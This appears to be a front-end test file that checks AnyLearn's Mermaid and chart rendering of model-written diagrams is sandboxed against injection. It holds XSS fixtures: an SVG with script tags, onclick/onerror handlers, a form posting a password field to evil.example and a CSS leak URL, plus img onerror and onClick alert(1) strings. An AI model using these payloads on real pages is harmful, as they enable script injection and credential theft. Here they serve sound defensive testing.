/**
 * diagrams.test.tsx
 *
 * Diagrams in answers (learning depth, phase 5). A diagram's source is model
 * output, so the rules under test are the safety ones: Mermaid runs strict
 * with no HTML labels, its SVG is shown only through `<img>` so nothing it
 * contains reaches the page, oversized and half-written fences are never
 * drawn, and a chart is built from an allow-listed spec.
 *
 * jsdom cannot lay out SVG, so Mermaid itself is replaced: the fake returns
 * the SVG an exploit would need Mermaid to produce, which is the worst case.
 */
import { readFileSync } from "node:fs";
import { resolve } from "node:path";
import { beforeAll, beforeEach, describe, expect, it, vi } from "vitest";
import { render, screen, waitFor } from "@testing-library/react";
import { initI18n } from "~/lib/i18n";
import { RichText } from "~/components/rich-text";
import { parseChartSpec } from "~/lib/chart-spec";
import { MessageList, type ChatTurnView } from "~/components/chat/message-list";
import { createMemoryRouter, RouterProvider } from "react-router";

const mermaid = vi.hoisted(() => ({
  initialize: vi.fn(),
  parse: vi.fn(async (_src: string) => true),
  render: vi.fn(async (_id: string, _src: string) => ({ svg: "" })),
}));
vi.mock("mermaid", () => ({ default: mermaid }));

const charts = vi.hoisted(() => ({ made: [] as { type: string; data: unknown; options: unknown }[] }));
vi.mock("chart.js/auto", () => ({
  default: class {
    constructor(_canvas: unknown, config: { type: string; data: unknown; options: unknown }) {
      charts.made.push(config);
    }
    destroy() {}
  },
}));

// Payloads from the 2025–2026 Mermaid advisories: script in a sequence
// label, HTML in an architecture icon's text, a classDef that smuggles CSS,
// and a foreignObject form. Mermaid's sanitiser should stop them; this test
// assumes it did not.
const HOSTILE_SVG = `<svg xmlns="http://www.w3.org/2000/svg" id="lp-evil-svg">
  <script>window.__pwned = true</script>
  <text id="lp-evil-label" onclick="window.__pwned = true">Alice</text>
  <foreignObject><form id="lp-evil-form" action="https://evil.example"><input name="password"/></form></foreignObject>
  <style>.node{background:url(https://evil.example/leak)}</style>
  <image href="https://evil.example/x.png" onerror="window.__pwned = true"/>
</svg>`;

const fence = (lang: string, body: string) => "Here it is:\n\n```" + lang + "\n" + body + "\n```\n";

beforeAll(() => {
  initI18n("en");
  URL.createObjectURL = vi.fn(() => "blob:http://localhost/diagram");
  URL.revokeObjectURL = vi.fn();
});

beforeEach(() => {
  mermaid.initialize.mockClear();
  mermaid.parse.mockReset().mockResolvedValue(true);
  mermaid.render.mockReset().mockResolvedValue({ svg: HOSTILE_SVG });
  charts.made.length = 0;
});

describe("Mermaid fences", () => {
  it("draw through an <img>, strict, with no HTML labels", async () => {
    render(<RichText text={fence("mermaid", "graph TD\n  A-->B")} sources={[]} />);
    const img = await screen.findByRole("img", { name: "Diagram" });
    expect(img).toHaveAttribute("src", "blob:http://localhost/diagram");
    expect(mermaid.initialize).toHaveBeenCalledWith(
      expect.objectContaining({
        securityLevel: "strict",
        startOnLoad: false,
        htmlLabels: false,
        flowchart: { htmlLabels: false },
      }),
    );
    expect(mermaid.render).toHaveBeenCalledWith(expect.any(String), "graph TD\n  A-->B");
  });

  it("never put anything from the SVG into the page", async () => {
    render(<RichText text={fence("mermaid", "sequenceDiagram\n  Alice->>Bob: <script>x</script>")} sources={[]} />);
    await screen.findByRole("img", { name: "Diagram" });
    for (const sel of ["svg", "script", "foreignObject", "form", "#lp-evil-svg", "#lp-evil-label", "[onclick]", "[onerror]", "style"]) {
      expect(document.querySelector(sel), sel).toBeNull();
    }
    expect((window as unknown as { __pwned?: boolean }).__pwned).toBeUndefined();
  });

  it("show the source and a note when Mermaid cannot draw it", async () => {
    mermaid.parse.mockRejectedValueOnce(new Error("Parse error on line 1"));
    render(<RichText text={fence("mermaid", "graph TD\n  A-->")} sources={[]} />);
    expect(await screen.findByText(/Could not draw this diagram/)).toBeInTheDocument();
    expect(screen.getByText(/A-->/)).toBeInTheDocument();
    expect(screen.queryByRole("img")).toBeNull();
  });

  it("refuse an oversized diagram without loading Mermaid", async () => {
    const huge = "graph TD\n" + Array.from({ length: 400 }, (_, i) => `  N${i}-->N${i + 1}`).join("\n");
    render(<RichText text={fence("mermaid", huge)} sources={[]} />);
    expect(screen.getByText(/too large to draw/)).toBeInTheDocument();
    await new Promise((r) => setTimeout(r, 20));
    expect(mermaid.render).not.toHaveBeenCalled();
  });

  it("refuse a directive or a click handler without loading Mermaid", async () => {
    render(<RichText text={fence("mermaid", "%%{init: {'securityLevel':'loose'}}%%\ngraph TD\n  A-->B")} sources={[]} />);
    expect(screen.getByText(/Could not draw this diagram/)).toBeInTheDocument();
    await new Promise((r) => setTimeout(r, 20));
    expect(mermaid.render).not.toHaveBeenCalled();
  });

  it("are not drawn while the answer is still streaming", async () => {
    render(<RichText text={fence("mermaid", "graph TD\n  A-->B")} sources={[]} streaming />);
    expect(screen.getByText(/A-->B/)).toBeInTheDocument();
    await new Promise((r) => setTimeout(r, 20));
    expect(mermaid.render).not.toHaveBeenCalled();
    expect(screen.queryByRole("img")).toBeNull();
  });
});

describe("chart fences", () => {
  const valid = JSON.stringify({
    type: "bar",
    data: { labels: ["2024", "2025"], datasets: [{ label: "Readers", data: [3, 5] }] },
    options: { plugins: { title: { text: "Readers per year" } }, onClick: "alert(1)" },
  });

  it("draw a canvas from the validated spec, with the numbers as a table", async () => {
    render(<RichText text={fence("chart", valid)} sources={[]} />);
    expect(await screen.findByRole("img", { name: "Readers per year" })).toBeInTheDocument();
    await waitFor(() => expect(charts.made).toHaveLength(1));
    expect(JSON.stringify(charts.made[0])).not.toContain("alert");
    expect(screen.getByRole("columnheader", { name: "Readers" })).toBeInTheDocument();
    expect(screen.getByRole("cell", { name: "5" })).toBeInTheDocument();
  });

  it("show a spec outside the allow-list as written", () => {
    const bad = JSON.stringify({ type: "sankey", data: { datasets: [{ data: [1] }] } });
    render(<RichText text={fence("chart", bad)} sources={[]} />);
    expect(screen.getByText(/not in a form AnyLearn can draw/)).toBeInTheDocument();
    expect(charts.made).toHaveLength(0);
  });

  it("leave every other fence a code block", () => {
    render(<RichText text={fence("html", "<img src=x onerror=alert(1)>")} sources={[]} />);
    expect(screen.getByText("<img src=x onerror=alert(1)>")).toBeInTheDocument();
    expect(document.querySelector("img")).toBeNull();
  });
});

describe("parseChartSpec", () => {
  it("agrees with the server's rules on every shared fixture", () => {
    // internal/capabilities/visualize runs the same file through its Go port.
    const path = resolve(process.cwd(), "../../internal/capabilities/visualize/testdata/charts.json");
    const cases = JSON.parse(readFileSync(path, "utf8")) as { name: string; ok: boolean; source: unknown }[];
    expect(cases.length).toBeGreaterThan(5);
    for (const c of cases) {
      const spec = parseChartSpec(JSON.stringify(c.source));
      expect(spec !== null, c.name).toBe(c.ok);
      if (spec) expect(JSON.stringify(spec), c.name).not.toMatch(/alert|borderColor/);
    }
  });

  it("builds a new spec from the allowed fields only", () => {
    const spec = parseChartSpec(
      JSON.stringify({
        type: "line",
        data: { labels: ["a"], datasets: [{ label: "s", data: [1], borderColor: "red", tension: 9 }] },
        options: { scales: { y: { stacked: true, title: { text: "Count" } } }, plugins: { tooltip: { callbacks: {} } } },
        plugins: [{ id: "evil" }],
      }),
    );
    expect(spec).toEqual({
      type: "line",
      labels: ["a"],
      datasets: [{ label: "s", data: [1] }],
      title: undefined,
      xTitle: undefined,
      yTitle: "Count",
      stacked: true,
    });
  });

  it("refuses what cannot be drawn safely", () => {
    const ds = (data: unknown[]) => JSON.stringify({ type: "bar", data: { labels: [], datasets: [{ data }] } });
    expect(parseChartSpec("not json")).toBeNull();
    expect(parseChartSpec(ds(["function(){ return 1 }"]))).toBeNull();
    expect(parseChartSpec(ds(Array.from({ length: 501 }, () => 1)))).toBeNull();
    expect(parseChartSpec(JSON.stringify({ type: "scatter", data: { datasets: [{ data: [1, 2] }] } }))).toBeNull();
    expect(
      parseChartSpec(JSON.stringify({ type: "bar", data: { datasets: Array.from({ length: 9 }, () => ({ data: [1] })) } })),
    ).toBeNull();
  });
});

describe("Draw it", () => {
  function renderTurns(turns: ChatTurnView[], posts: Record<string, string>[] = []) {
    const router = createMemoryRouter(
      [
        { path: "/", element: <MessageList turns={turns} /> },
        {
          path: "/app/api/diagram",
          action: async ({ request }) => {
            posts.push(Object.fromEntries(await request.formData()) as Record<string, string>);
            return { ok: true, message: { id: "d2", content: "```mermaid\ngraph TD\n  A-->B\n```" } };
          },
        },
      ],
      { initialEntries: ["/"] },
    );
    return render(<RouterProvider router={router} />);
  }
  const answer = (over: Partial<ChatTurnView>): ChatTurnView => ({
    id: "m1", role: "assistant", content: "Water boils at 100 °C.", sources: [], capability: "chat", ...over,
  });

  it("is offered under a stored, finished answer only", () => {
    renderTurns([answer({}), answer({ id: "m2", streaming: true }), answer({ id: "live-1", capability: undefined })]);
    expect(screen.getAllByRole("button", { name: "Draw it" })).toHaveLength(1);
  });

  it("is not offered under a diagram, which asks for its one repair when Mermaid cannot parse it", async () => {
    mermaid.parse.mockRejectedValue(new Error("Parse error on line 2"));
    const posts: Record<string, string>[] = [];
    renderTurns([answer({ id: "d1", capability: "visualize", content: fence("mermaid", "graph TD\n  A-->") })], posts);
    expect(screen.queryByRole("button", { name: "Draw it" })).toBeNull();
    await waitFor(() => expect(posts).toHaveLength(1));
    expect(posts[0]).toMatchObject({ intent: "repair", diagramId: "d1", error: "Parse error on line 2" });
    await new Promise((r) => setTimeout(r, 30));
    expect(posts).toHaveLength(1);
  });

  it("posts the answer's id when pressed", async () => {
    const posts: Record<string, string>[] = [];
    renderTurns([answer({})], posts);
    await (await import("@testing-library/user-event")).default.click(screen.getByRole("button", { name: "Draw it" }));
    await waitFor(() => expect(posts[0]).toMatchObject({ intent: "draw", messageId: "m1" }));
  });
});

